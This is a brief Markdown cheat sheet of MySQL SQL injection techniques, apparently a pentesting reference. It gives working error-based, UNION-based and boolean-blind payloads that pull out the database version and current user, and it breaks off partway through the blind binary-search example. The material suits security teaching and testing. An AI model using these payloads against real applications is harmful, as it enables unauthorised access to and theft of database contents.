# MySQL

## Error-based
This technique forces the database to generate an error that includes the leaked data in the error message, useful for quick extraction when errors are displayed.

To retrieve the database version:
' AND UPDATEXML(1,CONCAT(0x2e,version()),1) --

To retrieve the current user:
' AND UPDATEXML(1,CONCAT(0x2e,user()),1) --

## Union query-based
Append a UNION SELECT to merge results from your query with the original, extracting data directly into the response columns.

To retrieve the database version:
' UNION SELECT NULL, @@version --

To retrieve the current user:
' UNION SELECT NULL, user() --

## Boolean-based blind
Send conditions that change the application's behavior based on whether the condition is true or false, allowing inference of data without seeing direct output.

To find length of current user (binary search, assume 5):

Check if LENGTH(user()) > 16:
' AND IF(LENGTH(user())>16,1,0)=1 --

(Assume false)

Check if LENGTH(user()) > 8:
' AND IF(LENGTH(user())>8,1,0)=1 --

(Assume false)

Check if LENGTH(user()) > 4:
